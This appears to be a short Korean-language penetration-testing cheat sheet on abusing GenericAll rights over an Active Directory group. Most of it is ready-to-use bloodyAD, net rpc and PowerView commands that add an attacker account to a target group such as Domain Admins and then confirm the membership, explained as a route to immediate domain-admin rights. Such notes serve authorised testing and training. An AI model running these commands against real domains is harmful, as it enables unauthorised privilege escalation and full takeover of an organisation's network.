# 그룹 대상

그룹에 GenericAll이 있으면 해당 그룹에 원하는 계정을 자유롭게 추가할 수 있다. 자신을 Domain Admins에 추가하면 즉시 DA 권한을 획득한다.

## AddMember

```bash
bloodyAD --host <DC_IP> -d <도메인> -u <공격자계정> -p '<패스워드>' \
  add groupMember '<대상그룹>' <공격자계정>  # ← 수정

net rpc group addmem "<대상그룹>" <공격자계정> \
  -U <도메인>/<공격자계정>%'<패스워드>' \
  -S <DC_IP>

# 추가 확인
bloodyAD --host <DC_IP> -d <도메인> -u <공격자계정> -p '<패스워드>' \
  get groupMember '<대상그룹>'
```

```powershell
Add-DomainGroupMember -Identity '<대상그룹>' -Members <공격자계정> -Verbose  # ← 수정
Get-DomainGroupMember -Identity '<대상그룹>' | Select-Object MemberName
```
